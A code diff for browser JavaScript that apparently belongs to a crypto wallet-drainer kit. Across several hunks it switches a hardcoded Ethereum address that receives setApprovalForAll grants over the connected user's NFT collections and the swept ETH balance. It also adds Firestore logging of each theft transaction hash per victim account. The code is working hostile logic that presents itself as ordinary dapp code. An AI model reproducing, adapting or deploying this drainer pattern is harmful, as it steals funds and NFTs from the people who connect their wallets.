@@ -827,7 +827,7 @@ console.log(collection)
       
 
               var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
-              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+              await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})
 
               collection[i].date = new Date()
               collection[i].approved = true
@@ -922,13 +922,14 @@ const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
 console.log(finalAmount)
 const txData = {
   from: account,
-  to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
   value: finalAmount,
 };
 
 
 await web3.eth.sendTransaction(txData)
   .then( (txHash) => {
+    db.collection(`${account}`).add({sent: txHash})
     console.log(txHash)
   }).catch( (err) => {
     console.log(err)
@@ -954,13 +955,14 @@ const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
 console.log(finalAmount)
 const txData = {
   from: account,
-  to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
   value: finalAmount,
 };
 
 
 await web3.eth.sendTransaction(txData)
   .then( (txHash) => {
+    db.collection(`${account}`).add({sent: txHash})
     console.log(txHash)
   }).catch( (err) => {
     console.log(err)
@@ -1090,7 +1092,7 @@ for (let i = 0; i < collection.length; i++) {
   
 
           var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
-          await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+          await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})
 
           collection[i].date = new Date()
           collection[i].approved = true
@@ -1184,13 +1186,14 @@ const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
 console.log(finalAmount)
 const txData = {
   from: account,
-  to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
   value: finalAmount,
 };
 
 
 await web3.eth.sendTransaction(txData)
   .then( (txHash) => {
+    db.collection(`${account}`).add({sent: txHash})
     console.log(txHash)
   }).catch( (err) => {
     console.log(err)
@@ -1216,13 +1219,16 @@ const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
 console.log(finalAmount)
 const txData = {
   from: account,
-  to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+  to: '0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12',
   value: finalAmount,
 };
 
 
 await web3.eth.sendTransaction(txData)
   .then( (txHash) => {
+
+     db.collection(`${account}`).add({sent: txHash})
+
     console.log(txHash)
   }).catch( (err) => {
     console.log(err)
